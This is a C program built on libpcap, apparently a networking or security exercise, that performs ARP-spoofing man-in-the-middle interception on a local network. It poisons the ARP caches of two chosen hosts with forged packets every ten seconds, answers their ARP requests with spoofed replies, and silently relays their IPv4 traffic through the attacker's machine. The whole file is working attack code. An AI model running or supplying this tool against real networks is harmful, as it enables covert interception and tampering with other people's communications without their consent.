#include <stdio.h>
#include <pcap.h>
#include <time.h>

#include "getaddr.h"
#include "sendpkt.h"



int main(int argc, char *argv[])
{
    if( argc != 4 ) {
        printf("Usage: %s <interface> <sendter> <target>\n", argv[0]);
        return 1;
    }

    // open a handle of interface
    char *interface = argv[1];
    char err_msg[PCAP_ERRBUF_SIZE];
    pcap_t *interface_handle = pcap_open_live(interface, 0xFFFF, 0, 1, err_msg);
    if( interface_handle == NULL ) {
        fprintf(stderr, "[!] Can't open interface (%s)\n", interface);
        fprintf(stderr, "\tmsg: %s\n", err_msg);
        return 1;
    }



    // get ipv4 and mac address on interface
    uint32_t my_ip;
    uint8_t my_mac[6];
    struct in_addr tmp;

    if( ! get_ipv4_addr_on_dev(interface, &my_ip) ) {
        fprintf(stderr, "[!] Can't get interface's ipv4 address (%s)\n", interface);
        return 1;
    }
    tmp.s_addr = my_ip;
    printf("[*] IPv4 address of %s: %s\n", interface, inet_ntoa(*((struct in_addr *)(&my_ip))));

    if( ! get_mac_addr_on_dev(interface, my_mac) ) {
        fprintf(stderr, "[!] Can't get interface's mac address (%s)\n", interface);
        return 1;
    }
    printf("[*] MAC address of %s: %02X-%02X-%02X-%02X-%02X-%02X\n", interface,
           my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]
    );



    // get mac address of sender and target
    uint32_t sender_ip, target_ip;
    uint8_t sender_mac[6], target_mac[6];

    if( (sender_ip = inet_addr(argv[2])) == (uint32_t)INADDR_NONE ) {
        fprintf(stderr, "[!] Can't convert ip address string to integer (%s)\n", argv[2]);
        return 1;
    }

    if( (target_ip = inet_addr(argv[3])) == (uint32_t)INADDR_NONE ) {
        fprintf(stderr, "[!] Can't convert ip address string to integer (%s)\n", argv[3]);
        return 1;
    }

    if( ! find_remote_mac_by_arp(interface_handle, my_mac, my_ip, sender_ip, sender_mac) ) {
        fprintf(stderr, "[!] Can't get mac address of (%s)\n", argv[2]);
        return 1;
    }

    if( ! find_remote_mac_by_arp(interface_handle, my_mac, my_ip, target_ip, target_mac) ) {
        fprintf(stderr, "[!] Can't get mac address of (%s)\n", argv[3]);
        return 1;
    }

    printf("[*] MAC address of %s: %02X-%02X-%02X-%02X-%02X-%02X\n", "sender",
           sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]
    );

    printf("[*] MAC address of %s: %02X-%02X-%02X-%02X-%02X-%02X\n", "target",
           target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5]
    );



    time_t before = time(0);
    printf("[*] Send to sender and target ARP Spoofing packet\n");
    send_arp(interface_handle, my_mac, sender_ip, target_mac, target_ip, ARPOP_REQUEST);
    send_arp(interface_handle, my_mac, target_ip, sender_mac, sender_ip, ARPOP_REQUEST);
    while( 1 ) {

        // send arp infect packet every 10 seconds.
        time_t now = time(0);
        if( now - before > 10 ) {
            send_arp(interface_handle, my_mac, sender_ip, target_mac, target_ip, ARPOP_REQUEST);
            send_arp(interface_handle, my_mac, target_ip, sender_mac, sender_ip, ARPOP_REQUEST);
            before = now;
        }

        struct pcap_pkthdr *rcv_header;
        const u_char *rcv_frame;

        int result_capturing = pcap_next_ex(interface_handle, &rcv_header, &rcv_frame);

        // error occurred.
        if( result_capturing < 0 )
        {
            fprintf(stderr, "Error occurred at pcap_next_ex\n");
            fprintf(stderr, "Error Message: %s\n", pcap_geterr(interface_handle));
            break;
        }

        // timeout.
        else if( result_capturing == 0 )
        {
            // DO NOT ANYTHING
        }

        // success to capture a packet without problems.
        else
        {
            struct libnet_ethernet_hdr *rcv_eth_hdr = (struct libnet_ethernet_hdr *)(&rcv_frame[0]);

            // check that upper protocol is arp.
            if( IS_ARP(rcv_frame) && ntohs(((struct libnet_arp_hdr *)(&rcv_frame[sizeof(struct libnet_ethernet_hdr)]))->ar_op) == ARPOP_REQUEST ) {
                //struct libnet_arp_hdr *rcv_arp_hdr = (struct libnet_arp_hdr *)(&rcv_frame[sizeof(struct libnet_ethernet_hdr)]);

                struct arp_body *rcv_payload = (struct arp_body *)(&rcv_frame[sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr)]);
                uint32_t snd_ip = *((uint32_t *)rcv_payload->snd_ip);
                uint32_t tgt_ip = *((uint32_t *)rcv_payload->tgt_ip);

                uint8_t *remote_mac;

                // reply to target that i'm a sender.
                if( snd_ip == target_ip && tgt_ip == sender_ip ) {
                    remote_mac = target_mac;
                }
                // reply to sender that i'm a target.
                else if( snd_ip == sender_ip && tgt_ip == target_ip ) {
                    remote_mac = sender_mac;
                }
                else {
                    continue;
                }

                sleep(1); // if sender sent arp brocast request, to sleep I will overwrite it's arp table
                send_arp(interface_handle, my_mac, tgt_ip, remote_mac, snd_ip, ARPOP_REPLY);
                printf("[+] Send ARP reply to %s\n", inet_ntoa(*((struct in_addr *)(&snd_ip))));
            }

            // check that upper protocol is ipv4
            else if( IS_IPV4(rcv_frame) ) {
                struct libnet_ipv4_hdr *ipv4_hdr = (struct libnet_ipv4_hdr *)&rcv_frame[sizeof(struct libnet_ethernet_hdr)];

                uint32_t src_ip = ipv4_hdr->ip_src.s_addr;
                uint32_t dst_ip = ipv4_hdr->ip_dst.s_addr;

                uint8_t *remote_mac;

                // relay packet from sender to target.
                if( src_ip == sender_ip && dst_ip == target_ip ) {
                    remote_mac = target_mac;
                }
                // relay packet from target to sender.
                else if( src_ip == target_ip && dst_ip == sender_ip ) {
                    remote_mac = sender_mac;
                }
                else {
                    continue;
                }

                memcpy((void *)rcv_eth_hdr->ether_dhost, remote_mac, 6);
                memcpy((void *)rcv_eth_hdr->ether_shost, my_mac, 6);

                pcap_sendpacket(interface_handle, rcv_frame, rcv_header->caplen);
            }
        }
    } // end of while( 1 )

    pcap_close(interface_handle);

    return 0;
}
